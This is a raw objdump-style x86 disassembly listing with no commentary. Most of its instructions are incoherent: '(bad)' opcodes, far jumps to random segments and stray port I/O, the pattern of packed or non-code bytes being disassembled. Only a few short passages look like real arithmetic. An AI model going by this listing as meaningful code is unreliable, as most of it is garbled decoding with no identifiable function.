  41323e:	push   ss
  41323f:	cmp    al,0x72
  413241:	mul    DWORD PTR [ecx-0x64c4713f]
  413247:	adc    ecx,DWORD PTR [ebx]
  413249:	mov    dl,0xb9
  41324b:	mov    al,0x71
  41324d:	or     eax,0x314303df
  413252:	and    BYTE PTR [eax],bh
  413254:	adc    BYTE PTR [eax-0x13003885],ah
  41325a:	rcl    BYTE PTR [ecx],cl
  41325c:	xchg   ebp,eax
  41325d:	out    0x61,eax
  41325f:	stos   BYTE PTR es:[edi],al
  413260:	jmp    0x41328b
  413262:	cmp    al,0xd0
  413264:	(bad)  
  413266:	jge    0x4132e7
  413268:	or     DWORD PTR [edx],0xffffff88
  41326b:	sahf   
  41326c:	and    BYTE PTR [ebx],dl
  41326e:	xor    BYTE PTR [eax-0x1c498518],al
  413274:	mov    ch,0xa3
  413276:	(bad)  
  413277:	sub    ah,bl
  413279:	scas   al,BYTE PTR es:[edi]
  41327a:	test   al,0x85
  41327c:	jecxz  0x413205
  41327e:	enter  0x7745,0xfa
  413282:	inc    ebx
  413283:	sbb    BYTE PTR [ecx-0x7f51416e],bh
  413289:	js     0x413262
  41328b:	cmp    BYTE PTR [ebp+0x58],0x74
  41328f:	xchg   DWORD PTR [eax-0x38cba1a8],eax
  413295:	sub    dl,BYTE PTR ds:0x848ded60
  41329b:	bound  edi,QWORD PTR fs:[ebp+0x2a]
  41329f:	mov    edi,0xe5a074c3
  4132a4:	nop
  4132a5:	mov    ah,0x39
  4132a7:	call   0x8208e62f
  4132ac:	(bad)  
  4132ad:	mov    dh,0xc7
  4132af:	adc    ebp,ebx
  4132b1:	(bad)  
  4132b2:	adc    eax,DWORD PTR [esi+0x5d]
  4132b5:	mov    bh,0xdc
  4132b7:	sbb    edx,edi
  4132b9:	pop    eax
  4132ba:	inc    edx
  4132bb:	jo     0x4132ac
  4132bd:	icebp  
  4132be:	jmp    0xaf93:0xadb43e69
  4132c5:	xchg   edi,eax
  4132c6:	test   DWORD PTR [esi+0x1bf9747b],0x7698834a
  4132d0:	imul   ecx,DWORD PTR [edi+0xb13a3a8],0xffffff82
  4132d7:	jp     0x413354
  4132d9:	(bad)  
  4132da:	iret   
  4132db:	stos   DWORD PTR es:[edi],eax
  4132dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132dd:	and    BYTE PTR [edi-0x5a],bh
  4132e0:	mov    dh,0x25
  4132e2:	sub    DWORD PTR [eax],esp
  4132e4:	mov    dl,0xf1
  4132e6:	xchg   esp,eax
  4132e7:	call   0x5e4eb7fa
  4132ec:	jg     0x413360
  4132ee:	arpl   WORD PTR [edx-0x1f],ax
  4132f1:	loope  0x413281
  4132f3:	jb     0x413346
  4132f5:	mov    eax,0x91d8bfbe
  4132fa:	call   0x312308bb
  4132ff:	popf   
  413300:	pop    ds
  413301:	push   0x16
  413303:	cwde   
  413304:	sub    ch,bl
  413306:	xchg   edx,eax
  413307:	(bad)  
  413308:	gs retf 
  41330a:	push   edi
  41330b:	cli    
  41330c:	pushf  
  41330d:	mov    al,ds:0xd9413157
  413312:	test   ebp,esp
  413314:	stc    
  413315:	stos   DWORD PTR es:[edi],eax
  413316:	repz pop ebp
  413318:	ds fwait
  41331a:	xchg   esi,eax
  41331b:	sub    DWORD PTR [eax],esp
  41331d:	gs pop ebx
  41331f:	lock sbb al,0x20
  413322:	mov    edi,0xfa34f30f
  413327:	jge    0x413326
  413329:	mov    bl,0xe6
  41332b:	jmp    0x1e24:0xc0d7d313
  413332:	ja     0x413359
  413334:	das    
  413335:	push   ebx
  413336:	sbb    al,0x9f
  413338:	retf   
  413339:	inc    ebx
  41333a:	xor    ah,BYTE PTR [ebp-0x37]
  41333d:	jp     0x4132d4
  41333f:	mov    al,0x98
  413341:	(bad)  
  413342:	and    esp,edx
  413344:	pushf  
  413345:	shl    DWORD PTR ds:0xf95404c7,0x22
  41334c:	mov    BYTE PTR [ebp+0x23],cl
  41334f:	out    0x2f,eax
  413351:	xchg   edi,eax
  413352:	call   0xc4ea:0xd71a5950
  413359:	adc    ebp,DWORD PTR [ecx-0x45906852]
  41335f:	(bad)  [edx-0x56]
  413362:	fxch   st(3)
  413364:	retf   0x9485
  413367:	mov    esi,0x9c0edc38
  41336c:	aad    0x1b
  41336e:	std    
  41336f:	fmulp  st(0),st
  413371:	aam    0xb8
  413373:	inc    ecx
  413374:	jl     0x4133d5
  413376:	sahf   
  413377:	push   edx
  413378:	sbb    eax,0x51cbbb62
  41337d:	rol    bh,1
  41337f:	loope  0x4133c9
  413381:	repz mov bh,0xc
  413384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413385:	sbb    DWORD PTR [edx+ebx*8],ecx
  413388:	push   ds
  413389:	rol    BYTE PTR [edi],1
  41338b:	add    eax,0xfbe46bb0
  413390:	loope  0x41336b
  413392:	aas    
  413393:	dec    edx
  413394:	es out 0x19,eax
  413397:	nop    DWORD PTR [ebx-0xb1ab8fe]
  41339e:	inc    ecx
  41339f:	pop    eax
  4133a0:	xlat   BYTE PTR ds:[ebx]
  4133a1:	xchg   edi,eax
  4133a2:	test   DWORD PTR [ebp-0x6d],ebx
  4133a5:	fwait
  4133a6:	les    edx,FWORD PTR [edx]
  4133a8:	scas   eax,DWORD PTR es:[edi]
  4133a9:	or     ecx,DWORD PTR [esi-0x50968f65]
  4133af:	icebp  
  4133b0:	fwait
  4133b1:	pop    ss
  4133b2:	push   ss
  4133b3:	sub    BYTE PTR [ebx],al
  4133b5:	leave  
  4133b6:	mov    bl,0x55
  4133b8:	cmp    ebx,eax
  4133ba:	xchg   ebp,eax
  4133bb:	cmp    al,0x17
  4133bd:	xor    BYTE PTR [eax],ah
  4133bf:	repz push esp
  4133c1:	mov    ecx,0xe3b0dda1
  4133c6:	jno    0x4133ff
  4133c8:	add    al,0x29
  4133ca:	les    ebx,FWORD PTR [edi]
  4133cc:	add    ebp,edi
  4133ce:	stos   BYTE PTR es:[edi],al
  4133cf:	pop    ebp
  4133d0:	push   ebx
  4133d1:	int    0x74
  4133d3:	adc    BYTE PTR [ecx+esi*1+0x5b],ch
  4133d7:	sbb    BYTE PTR [ecx+0x5b],dh
  4133da:	xlat   BYTE PTR ds:[ebx]
  4133db:	in     al,0x57
  4133dd:	push   esi
  4133de:	(bad)  
  4133df:	ss xchg edx,eax
  4133e1:	jecxz  0x4133a6
  4133e3:	inc    edi
  4133e4:	test   eax,0xff3828be
  4133e9:	cmp    bl,BYTE PTR [edi]
  4133eb:	add    eax,0xec82f6d5
  4133f0:	and    eax,0xa179fd41
  4133f5:	outs   dx,BYTE PTR ds:[esi]
  4133f6:	jb     0x4133a8
  4133f8:	sti    
  4133f9:	(bad)  
  4133fb:	repz xor ecx,DWORD PTR [eax+0x4e6b72b7]
  413402:	adc    al,0xd4
  413404:	jns    0x41344b
  413406:	fwait
  413407:	xor    ch,BYTE PTR [edi+0x1a]
  41340a:	popa   
  41340b:	pop    ds
  41340c:	outs   dx,DWORD PTR ds:[esi]
  41340d:	mov    edi,0xbdcfdad5
  413412:	retf   0x53d2
  413415:	cmp    DWORD PTR [ecx],edi
  413417:	pusha  
  413418:	dec    ecx
  413419:	jns    0x4133df
  41341b:	pop    es
  41341c:	arpl   WORD PTR [esi],bp
  41341e:	sub    al,0xbe
  413420:	mov    al,ds:0xc1f0647a
  413425:	shl    ecx,1
  413427:	adc    DWORD PTR [edx],ebx
  413429:	push   edi
  41342a:	sbb    DWORD PTR [ecx-0x3a],ebx
  41342d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342e:	add    BYTE PTR [ebp+0x4c],ah
  413431:	pop    edx
  413432:	dec    esi
  413433:	imul   esi,DWORD PTR [edx-0xa4fd12a],0xa564fbd8
  41343d:	stos   BYTE PTR es:[edi],al
  41343e:	sub    ch,ch
  413440:	ins    BYTE PTR es:[edi],dx
  413441:	dec    ecx
  413442:	inc    ebp
  413443:	shl    dl,cl
  413445:	xor    DWORD PTR [edx],esp
  413447:	stc    
  413448:	lods   al,BYTE PTR ds:[esi]
  413449:	data16 mov al,0x7d
  41344c:	dec    eax
  41344d:	sbb    dh,BYTE PTR [ecx]
  41344f:	dec    dl
  413451:	les    edi,FWORD PTR [edx+edx*4]
  413454:	mov    al,0xaa
  413456:	and    DWORD PTR [esi],edx
  413458:	mov    esi,0x8fc556
  41345d:	jo     0x413413
  41345f:	and    BYTE PTR [ebx+eiz*1+0x7],bh
  413463:	outs   dx,BYTE PTR ds:[esi]
  413464:	xchg   ecx,eax
  413465:	icebp  
  413466:	mov    al,ds:0x4908db5a
  41346b:	sub    BYTE PTR [ecx],ah
  41346d:	fwait
  41346e:	pop    esi
  41346f:	xchg   edx,eax
  413470:	int3   
  413471:	test   ebx,esp
  413473:	loopne 0x413446
  413475:	cmp    eax,0x741fc68e
  41347a:	add    eax,0xb0ba65ce
  41347f:	fadd   st,st(1)
  413481:	pushf  
  413482:	loope  0x4134bf
  413484:	sbb    edi,DWORD PTR [ecx]
  413486:	(bad)  
  413487:	dec    edx
  413488:	(bad)  
  41348a:	sbb    ecx,DWORD PTR [ecx+0x739a8f4c]
  413490:	ret    0xd491
  413493:	sub    ecx,0xa12fbffc
  413499:	cmc    
  41349a:	imul   dl
  41349c:	enter  0x5503,0xc9
  4134a0:	in     al,0xe6
  4134a2:	jl     0x413518
  4134a4:	stos   DWORD PTR es:[edi],eax
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x4220c5
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x72db8f61]
  4134d4:	sub    DWORD PTR [edx+0x18184264],ebp
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [ecx+0x74274a0f],dl
  4134e3:	dec    esp
  4134e4:	into   
  4134e5:	push   esi
  4134e6:	imul   edx,esi,0x5349ddb9
  4134ec:	add    al,0xc9
  4134ee:	sub    BYTE PTR [ecx],dh
  4134f0:	(bad)  
  4134f2:	cmp    al,0x3a
  4134f4:	arpl   sp,si
  4134f6:	nop
  4134f7:	pop    ebp
  4134f8:	loopne 0x413551
  4134fa:	ins    DWORD PTR es:[edi],dx
  4134fb:	xchg   ecx,eax
  4134fc:	pop    ebp
  4134fd:	repnz mov dh,BYTE PTR [ebp+0x1d]
  413501:	pushf  
  413502:	push   0xabe885ec
  413507:	int3   
  413508:	aaa    
  413509:	pop    esi
  41350a:	push   ecx
  41350b:	xchg   edx,eax
  41350c:	in     al,0x67
  41350e:	ss pop eax
  413510:	xchg   DWORD PTR [ebx],edx
  413512:	stos   BYTE PTR es:[edi],al
  413513:	ins    BYTE PTR es:[edi],dx
  413514:	aad    0x44
  413516:	mov    dh,0x1b
  413518:	push   ss
  413519:	inc    esi
  41351a:	sub    esp,ecx
  41351c:	aam    0xe6
  41351e:	cmp    eax,0x707d5815
  413523:	mov    dh,0xc2
  413525:	iret   
  413526:	xchg   esp,eax
  413527:	add    ebx,DWORD PTR [ebp-0x5ce389e7]
  41352d:	jae    0x41359a
  41352f:	push   edi
  413530:	pop    ecx
  413531:	jmp    0x22bab76c
  413536:	fcomp  QWORD PTR [edx+ebp*8+0xaebaa29]
  41353d:	int3   
  41353e:	add    eax,0x463012cf
  413543:	push   ds
  413544:	xor    BYTE PTR [ecx],ah
  413546:	enter  0x9896,0x11
  41354a:	ins    BYTE PTR es:[edi],dx
  41354b:	dec    ebx
  41354c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41354d:	stos   BYTE PTR es:[edi],al
  41354e:	xor    al,0xcb
  413550:	std    
  413551:	xor    edx,0xffffffd3
  413554:	pushf  
  413555:	loope  0x41356c
  413557:	inc    esi
  413558:	pop    esp
  413559:	aaa    
  41355a:	inc    BYTE PTR [edx]
  41355c:	pushf  
  41355d:	test   BYTE PTR [ecx+0x9cc2289],bh
  413563:	sti    
  413564:	pop    ebx
  413565:	fs jmp 0x413587
  413568:	inc    edi
  413569:	xchg   ecx,eax
  41356a:	cld    
  41356b:	push   0x2af72de0
  413570:	pop    ebp
  413571:	cmp    DWORD PTR [esi+0x7d],ebp
  413574:	push   cs
  413575:	(bad)  
  413577:	ss ret 
  413579:	jle    0x413525
  41357b:	jbe    0x413594
  41357d:	int3   
  41357e:	sbb    eax,0xb0a4a0c9
  413583:	pop    ebx
  413584:	into   
  413585:	aad    0x73
  413587:	stos   DWORD PTR es:[edi],eax
  413588:	dec    esp
  413589:	paddw  mm3,QWORD PTR [ebp-0x237b026d]
  413590:	pushf  
  413591:	add    cl,0xc5
  413594:	xor    al,0x13
  413596:	mov    esp,DWORD PTR [edx-0x7c]
  413599:	pop    esi
  41359a:	out    0xd8,eax
  41359c:	mov    ebx,DWORD PTR [edx-0x9509427]
  4135a2:	div    DWORD PTR [ecx+0x60]
  4135a5:	outs   dx,BYTE PTR ds:[esi]
  4135a6:	xor    eax,0xdd021bc9
  4135ab:	(bad)  
  4135ac:	lods   al,BYTE PTR ds:[esi]
  4135ad:	stc    
  4135ae:	xchg   ecx,eax
  4135af:	push   edi
  4135b0:	scas   al,BYTE PTR es:[edi]
  4135b1:	inc    esp
  4135b2:	pop    edx
  4135b3:	(bad)  
  4135b4:	test   eax,0xd825566
  4135b9:	aas    
  4135ba:	inc    eax
  4135bb:	push   cs
  4135bc:	jmp    0xacae730e
  4135c1:	je     0x4135c0
  4135c3:	clc    
  4135c4:	cld    
  4135c5:	es adc eax,0xebd89201
  4135cb:	out    dx,al
  4135cc:	push   0xfffffff3
  4135ce:	lds    ecx,FWORD PTR ss:[eax+ebx*2-0x7c]
  4135d3:	sbb    eax,0x3f6f2fb5
  4135d8:	mov    DWORD PTR [ecx-0x9553fe0],edi
  4135de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135df:	mov    DWORD PTR [ebp-0x6ea3ae74],ebx
  4135e5:	fisub  DWORD PTR [eax+0x1b3a7bfe]
  4135eb:	mov    ch,0xb2
  4135ed:	and    BYTE PTR [ebp-0x6aa0f839],0xf0
  4135f4:	mov    dl,0x28
  4135f6:	xchg   esp,eax
  4135f7:	inc    edi
  4135f8:	xor    DWORD PTR [eax+eax*1-0x4b],0xc14f400a
  413600:	stos   BYTE PTR es:[edi],al
  413601:	mov    cl,0xb3
  413603:	(bad)  
  413606:	jp     0x41367b
  413608:	inc    esp
  413609:	pushf  
  41360a:	dec    eax
  41360b:	xchg   ebx,eax
  41360c:	fild   DWORD PTR [ebx-0xc]
  41360f:	xchg   ebx,eax
  413610:	xchg   esi,eax
  413611:	cwde   
  413612:	or     eax,0x9cef9e15
  413617:	xor    DWORD PTR [ecx+0x313cb151],ecx
  41361d:	pop    ecx
  41361e:	sbb    al,0xcf
  413620:	fsub   DWORD PTR [edi]
  413622:	mov    al,0x38
  413624:	or     ebx,DWORD PTR [ebp+0xa22365a]
  41362a:	into   
  41362b:	add    eax,0x1e46142a
  413630:	push   esi
  413631:	pusha  
  413632:	fild   DWORD PTR [eax]
  413634:	mov    edi,0xa9e352c7
  413639:	out    0x94,eax
  41363b:	pop    edi
  41363c:	push   edx
  41363d:	rcr    BYTE PTR [edi],0x81
  413640:	xchg   esp,eax
  413641:	jecxz  0x41362e
  413643:	inc    esp
  413644:	fwait
  413645:	add    BYTE PTR [edi],al
  413647:	pop    ds
  413648:	hlt    
  413649:	adc    ebx,esp
  41364b:	inc    edx
  41364c:	hlt    
  41364d:	inc    esp
  41364e:	rcl    DWORD PTR [ebp+0x2d7f0e62],cl
  413654:	adc    al,0xe7
  413656:	push   eax
  413657:	jle    0x4136a9
  413659:	(bad)  
  41365a:	or     al,0x6a
  41365c:	fimul  WORD PTR [edi-0x2fdcf1ee]
  413662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413663:	xor    DWORD PTR [edx-0x6f],ebx
  413666:	sub    esp,ebx
  413668:	out    dx,al
  413669:	out    dx,al
  41366a:	xchg   ebp,eax
  41366b:	cmp    BYTE PTR [esi],cl
  41366d:	pop    ss
  41366e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366f:	dec    eax
  413670:	pop    ss
  413671:	mov    edx,DWORD PTR [ebx-0x29]
  413674:	int    0xf6
  413676:	inc    edi
  413677:	push   ecx
  413678:	sbb    DWORD PTR [edx-0x4b1dd2eb],esp
  41367e:	stos   BYTE PTR es:[edi],al
  41367f:	inc    esi
  413680:	or     cl,BYTE PTR [ebx]
  413682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413683:	dec    edi
  413684:	call   0xa93a8e2
  413689:	or     al,BYTE PTR ds:0xaa97ac41
  41368f:	scas   eax,DWORD PTR es:[edi]
  413690:	outs   dx,DWORD PTR ds:[esi]
  413691:	cmp    BYTE PTR [ebx+0x1c],bl
  413694:	cdq    
  413695:	cmp    bh,BYTE PTR [eax]
  413697:	and    eax,0xa52d3c
  41369c:	shl    esi,1
  41369e:	icebp  
  41369f:	div    DWORD PTR [edi]
  4136a1:	cmp    ebp,DWORD PTR [ebp-0x1706787e]
  4136a7:	pop    ebx
  4136a8:	daa    
  4136a9:	mov    esp,DWORD PTR [edi+0x17d24285]
  4136af:	clc    
  4136b0:	retf   0xb72
  4136b3:	outs   dx,BYTE PTR ds:[esi]
  4136b4:	push   es
  4136b5:	ss fwait
  4136b7:	mov    ds:0x9bd776c1,al
  4136bc:	push   0xa88e53cf
  4136c1:	dec    esp
  4136c2:	xor    BYTE PTR [ebx],cl
  4136c4:	pop    eax
  4136c5:	or     eax,0x5eb8bc84
  4136ca:	shr    eax,0x10
  4136cd:	stc    
  4136ce:	rcl    BYTE PTR [esi],0xa6
  4136d1:	loope  0x4136ed
  4136d3:	xchg   edx,eax
  4136d4:	retf   0xb823
  4136d7:	lods   al,BYTE PTR ds:[esi]
  4136d8:	jne    0x413716
  4136da:	jne    0x41367e
  4136dc:	popa   
  4136dd:	sub    bl,ah
  4136df:	sbb    BYTE PTR [ebp-0x74],ch
  4136e2:	or     DWORD PTR [bx+si+0x15],ebx
  4136e6:	sbb    al,0x75
  4136e8:	adc    eax,0x83ff8083
  4136ed:	inc    ebp
  4136ee:	xchg   bp,ax
  4136f0:	jg     0x413756
  4136f2:	(bad)  
  4136f3:	ret    
  4136f4:	add    edx,DWORD PTR [esi]
  4136f6:	adc    eax,0x611f1663
  4136fb:	mov    ds:0xed258113,eax
  413700:	push   edx
  413701:	mov    edx,0xa9b9f8a7
  413706:	jg     0x413744
  413708:	inc    eax
  413709:	in     al,dx
  41370a:	outs   dx,DWORD PTR ds:[esi]
  41370b:	xchg   esi,eax
  41370c:	fsubr  DWORD PTR [ecx]
  41370e:	mov    esi,0xd09f3cb3
  413713:	push   edi
  413714:	in     eax,0x3b
  413716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413717:	test   DWORD PTR [eax-0x7a9133ad],eax
  41371d:	jecxz  0x41369f
  41371f:	mov    bh,0xf3
  413721:	data16 xor BYTE PTR [ebx],dl
  413724:	in     al,0x54
  413726:	sub    al,0x84
  413728:	cmp    esi,DWORD PTR [ebx+ebp*1]
  41372b:	retf   0x3d82
  41372e:	cld    
  41372f:	leave  
  413730:	aad    0x63
  413732:	test   DWORD PTR [edi],0xc109971e
  413738:	(bad)  
  413739:	clc    
  41373a:	cdq    
  41373b:	cmc    
  41373c:	xchg   BYTE PTR [edx],ch
  41373e:	xor    eax,0xc65d52ff
  413743:	sub    eax,DWORD PTR [esi+esi*4]
  413746:	cld    
  413747:	xchg   edx,eax
  413748:	and    bl,BYTE PTR [eax-0x4f]
  41374b:	push   ss
  41374c:	les    ebx,FWORD PTR fs:[ebx+eiz*8]
  413750:	push   0xdd7cc990
  413755:	outs   dx,BYTE PTR ds:[esi]
  413756:	mov    dl,0x3c
  413758:	enter  0x3361,0xfe
  41375c:	mov    ebx,0x65a50b84
  413761:	test   BYTE PTR [ecx-0x12b13e3a],dh
  413767:	fidivr DWORD PTR [esi]
  413769:	arpl   cx,di
  41376b:	mov    ds:0x9648578a,eax
  413770:	push   esi
  413771:	dec    ecx
  413772:	stc    
  413773:	lock mov ds,WORD PTR [eax+0x3b46699a]
  41377a:	rcl    BYTE PTR [edi+0x55],cl
  41377d:	mov    esp,0x8099c9ed
  413782:	cld    
  413783:	pop    es
  413784:	mov    esp,0xbbc05e33
  413789:	sti    
  41378a:	mov    cl,0xae
  41378c:	outs   dx,BYTE PTR fs:[si]
  41378f:	inc    eax
  413790:	arpl   WORD PTR [eax],bp
  413792:	popa   
  413793:	sub    al,0x20
  413795:	sbb    dl,BYTE PTR es:[ebp+0x577d1e90]
  41379c:	mov    WORD PTR [ecx-0x1bd7b664],ds
  4137a2:	dec    dh
  4137a4:	pop    eax
  4137a5:	sbb    BYTE PTR [ebx+edx*4+0x3f3edd5e],cl
  4137ac:	retf   
  4137ad:	cld    
  4137ae:	sahf   
  4137af:	sbb    DWORD PTR [ecx+0x6a],ebp
  4137b2:	bound  ebx,QWORD PTR [esi]
  4137b4:	xchg   ebp,eax
  4137b5:	sbb    al,0xbd
  4137b8:	pushf  
  4137b9:	and    al,0x64
  4137bb:	jne    0x4137ae
  4137bd:	push   0xbca9ab64
  4137c2:	test   eax,0xb73e11ca
  4137c7:	mov    bh,0xe0
  4137c9:	sbb    ah,BYTE PTR [ebp-0x59d08f30]
  4137cf:	pop    es
  4137d0:	sbb    ch,BYTE PTR [eax+edi*8+0x721a09ee]
  4137d7:	xchg   esi,eax
  4137d8:	or     ebx,DWORD PTR [edx-0x56]
  4137db:	mov    edx,0xe8c8a9fa
  4137e0:	pop    edx
  4137e1:	xchg   eax,edi
  4137e3:	dec    eax
  4137e4:	pop    es
  4137e5:	lea    ecx,[edi-0x34fbd4bf]
  4137eb:	xlat   BYTE PTR ds:[ebx]
  4137ec:	inc    eax
  4137ed:	popa   
  4137ee:	mov    WORD PTR ds:0xc60cc413,?
  4137f4:	rcl    DWORD PTR [ebx+0x375010f],1
  4137fa:	sub    BYTE PTR [ebp-0x789895c8],al
  413800:	push   cs
  413801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413802:	shl    BYTE PTR [ebx-0x48852dc4],0x47
  413809:	pop    ebx
  41380a:	popf   
  41380b:	ss add al,0x94
  41380e:	out    0x52,eax
  413810:	mov    eax,ds:0x2039ef3f
  413815:	mov    ah,0x46
  413817:	push   0xf046ce7a
  41381c:	xchg   ebx,eax
  41381d:	mov    edx,eax
  41381f:	das    
  413820:	js     0x413816
  413822:	dec    ebp
  413823:	mov    bh,0xc0
  413825:	test   al,0x54
  413827:	mov    eax,0x350a7421
  41382c:	mov    ?,WORD PTR [edi]
  41382e:	mov    ebp,esp
  413830:	sahf   
  413831:	cli    
  413832:	pop    ebx
  413833:	sub    eax,0x3673603
  413838:	stc    
  413839:	inc    esp
  41383a:	shl    BYTE PTR [edx-0x54],0xfb
  41383e:	mov    dl,0x58
  413840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413841:	push   es
  413842:	aaa    
  413843:	(bad)  
  413844:	clc    
  413845:	jbe    0x4138a1
  413847:	repnz push edi
  413849:	rcl    DWORD PTR [edi],cl
  41384b:	fistp  QWORD PTR [ecx+ecx*1-0x20d5ab06]
  413852:	jmp    0xd139f49d
  413857:	jmp    0xedd106a0
  41385c:	dec    ebx
  41385d:	push   ds
  41385e:	int3   
  41385f:	sub    DWORD PTR [ecx],0x277ae78d
  413865:	jmp    DWORD PTR [esp+eax*2+0x2ac9def1]
  41386d:	and    DWORD PTR [edx+0x5a849c78],ebx
  413873:	add    cl,BYTE PTR [esi-0x60]
  413876:	paddb  mm7,QWORD PTR [eax+0x1f]
  41387a:	aaa    
  41387b:	or     DWORD PTR [esi+0x5c4becdd],ecx
  413881:	mov    ebx,0xf0cf5f6
  413886:	lods   al,BYTE PTR ds:[esi]
  413887:	cmp    al,BYTE PTR ds:0xb393e37
  41388d:	mov    ecx,DWORD PTR ds:0x70059786
  413893:	repnz fwait
  413895:	cli    
  413896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413897:	ins    DWORD PTR es:[edi],dx
  413898:	out    dx,eax
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x2c],ebp
  4138e5:	fisttp WORD PTR [ecx+0x6a]
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    bh,cl
  4138f1:	dec    eax
  4138f2:	int3   
  4138f3:	bound  edi,QWORD PTR es:[eax+0x16]
  4138f7:	lahf   
  4138f8:	sbb    ebx,esi
  4138fa:	mov    dl,0x32
  4138fc:	pop    ebx
  4138fd:	dec    ecx
  4138fe:	ja     0x4138e1
  413900:	inc    ebp
  413901:	(bad)  
  413903:	out    dx,al
  413904:	ss jb  0x41388e
  413907:	jb     0x4138d3
  413909:	out    0x8a,eax
  41390b:	and    dl,BYTE PTR [edx+0x1c]
  41390e:	shr    DWORD PTR [edx],cl
  413910:	inc    ebx
  413911:	inc    ebx
  413912:	out    0x4a,eax
  413914:	int3   
  413915:	call   0x658d:0xfd98c5ec
  41391c:	jle    0x4138a3
  41391e:	retf   
  41391f:	and    DWORD PTR [si],esp
  413922:	fist   WORD PTR [esi+0x30]
  413925:	ins    BYTE PTR es:[edi],dx
  413926:	loop   0x4138f6
  413928:	and    BYTE PTR [edx+0x3b072e77],0xeb
  41392f:	sub    DWORD PTR [ecx+eax*1-0x3d],ebp
  413933:	sub    dl,BYTE PTR [edi+edi*1]
  413936:	jns    0x413902
  413938:	pop    ebp
  413939:	jo     0x413973
  41393b:	inc    ecx
  41393c:	dec    esi
  41393d:	retf   
  41393e:	or     al,0x2e
  413940:	out    0x5d,eax
  413942:	jle    0x413951
  413944:	stos   DWORD PTR es:[edi],eax
  413945:	popf   
  413946:	iret   
  413947:	imul   esi,DWORD PTR [ecx-0x716156d6],0xd48f795c
  413951:	mov    esi,0x96164c18
  413956:	or     BYTE PTR [eax-0x5b43f63c],al
  41395c:	pop    eax
  41395d:	dec    ebx
  41395e:	fs push 0x5fb641a1
  413964:	push   esi
  413965:	repnz adc al,0x3c
  413968:	inc    edx
  413969:	or     esi,esp
  41396b:	das    
  41396c:	ds cmp dh,dl
  41396f:	cmp    esp,DWORD PTR [ecx+eax*2]
  413972:	fistp  QWORD PTR [ebx-0x7e1a71fd]
  413978:	cdq    
  413979:	std    
  41397a:	(bad)  
  41397b:	repnz test BYTE PTR [ebx+0x8],al
  41397f:	push   ecx
  413980:	cmp    eax,0x3b1b18b8
  413985:	pop    ds
  413986:	das    
  413987:	fcmovb st,st(0)
  413989:	push   es
  41398a:	shr    BYTE PTR [esi-0x2d5cae91],1
  413990:	ins    DWORD PTR es:[edi],dx
  413991:	sar    DWORD PTR [edx+0x58],0x85
  413995:	(bad)  
  413996:	fsubr  QWORD PTR [ecx]
  413998:	push   es
  413999:	adc    BYTE PTR [edi],cl
  41399b:	mov    al,ds:0x6ee76fe1
  4139a0:	aaa    
  4139a1:	ins    DWORD PTR es:[edi],dx
  4139a2:	dec    esi
  4139a3:	push   esp
  4139a4:	aaa    
  4139a5:	pop    esi
  4139a6:	cmp    al,0x76
  4139a8:	mov    cl,0x97
  4139aa:	mov    bh,BYTE PTR [ecx-0x36e26b8f]
  4139b0:	push   esi
  4139b1:	and    DWORD PTR [eax-0x26fc79a9],ebp
  4139b7:	jge    0x4139e0
  4139b9:	data16 test BYTE PTR [ebp-0x3a27cefb],0x3c
  4139c1:	in     eax,dx
  4139c2:	or     ebp,DWORD PTR [eax]
  4139c4:	xchg   esi,eax
  4139c5:	xor    bl,al
  4139c7:	push   edx
  4139c8:	retf   0x10ee
  4139cb:	dec    ebp
  4139cc:	adc    DWORD PTR [eax+0x60],0x4
  4139d0:	jmp    0xdc6864bd
  4139d5:	and    BYTE PTR ds:0x492cd333,dl
  4139db:	in     eax,0x94
  4139dd:	pop    esi
  4139de:	jl     0x4139ae
  4139e0:	mov    eax,ecx
  4139e2:	icebp  
  4139e3:	fsub   QWORD PTR [esi]
  4139e5:	sub    eax,0x8082979
  4139ea:	frstor [edx+0x3d]
  4139ed:	and    bl,bh
  4139ef:	js     0x4139cd
